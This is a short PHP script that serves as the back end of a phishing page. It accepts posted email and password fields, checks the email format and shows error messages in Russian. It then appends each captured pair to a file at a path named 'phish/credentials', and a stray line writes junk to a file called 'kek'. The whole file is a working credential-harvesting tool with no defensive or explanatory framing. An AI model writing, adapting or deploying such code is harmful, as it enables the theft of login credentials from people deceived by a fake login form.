<?php
if ($_POST) {
	$email = htmlspecialchars($_POST["email"]);
	$password = htmlspecialchars($_POST["password"]);
	$json = array();
	if (!$email or !$password) {
		$json['error'] = 'Вы зaпoлнили нe всe пoля!';
		echo json_encode($json); 
		die();
	}
	if(!preg_match("|^[-0-9a-z_\.]+@[-0-9a-z_^\.]+\.[a-z]{2,6}$|i", $email)) {
		$json['error'] = 'Нe вeрный фoрмaт email! >_<';
		echo json_encode($json);
		die();
	}

	file_put_contents('/var/www/html/phish/credentials', [$email, ':', $password, PHP_EOL], FILE_APPEND);
	
	$json['error'] = 0; 
	echo json_encode($json);
} else {
	echo 'GET LOST!';
}

file_put_contents('kek', ['werwe', ':erer', PHP_EOL], FILE_APPEND);
?>
